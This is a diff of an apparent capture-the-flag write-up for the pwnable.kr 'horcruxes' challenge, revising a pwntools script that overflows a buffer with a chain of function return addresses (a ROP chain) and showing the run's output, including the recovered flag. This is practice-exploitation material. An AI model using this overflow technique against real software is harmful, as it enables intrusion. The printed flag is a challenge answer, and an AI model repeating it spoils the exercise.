@@ -11976,10 +11976,9 @@ int G()
 from pwn import *
 import re
 
-context(arch='amd64', os='linux', log_level='debug')
 # shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
 # shell.download("/home/horcruxes/horcruxes", "./horcruxes")
-# io = shell.process('./horcruxes')  # too slow
+# io = shell.process('./horcruxes')
 io = remote('pwnable.kr', 9032)
 elf = ELF('./horcruxes')
 A_addr = elf.symbols['A']  # 0x809fe4b
@@ -12001,7 +12000,7 @@ call_ropme = 0x809fffc
 io.sendlineafter(b'Select Menu:', b'1')
 io.recvuntil(b'How many EXP did you earned? : ')
 padding = b'A'*(0x74+0x4)
-payload = padding + flat(A_addr, B_addr, C_addr, D_addr, E_addr, F_addr, G_addr, call_ropme)
+payload = padding + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(call_ropme)
 io.sendline(payload)
 sleep(2)
 msg = io.recv(1024).decode()
@@ -12037,16 +12036,16 @@ io.close()
 [+] Nagini the Snake => 0x809fee6
 [+] Harry Potter => 0x809ff05
 [*] You'd better get more experience to kill Voldemort
-    You found "Tom Riddle's Diary" (EXP +590843447)
-    You found "Marvolo Gaunt's Ring" (EXP +1015663338)
-    You found "Helga Hufflepuff's Cup" (EXP +835005618)
-    You found "Salazar Slytherin's Locket" (EXP +628068732)
-    You found "Rowena Ravenclaw's Diadem" (EXP +1958224011)
-    You found "Nagini the Snake" (EXP +-1513563442)
-    You found "Harry Potter" (EXP +1991018278)
+    You found "Tom Riddle's Diary" (EXP +731354578)
+    You found "Marvolo Gaunt's Ring" (EXP +1633347723)
+    You found "Helga Hufflepuff's Cup" (EXP +-1826248693)
+    You found "Salazar Slytherin's Locket" (EXP +-1251281593)
+    You found "Rowena Ravenclaw's Diadem" (EXP +-1441674942)
+    You found "Nagini the Snake" (EXP +2109566384)
+    You found "Harry Potter" (EXP +841356444)
     Select Menu:
-[+] result => 5505259982
-[+] Flag: You'd better get more experience to kill Voldemort
+[+] result => 796419901
+[+] Magic_spell_1s_4vad4_K3daVr4!
 [*] Closed connection to pwnable.kr port 9032
 ```
 
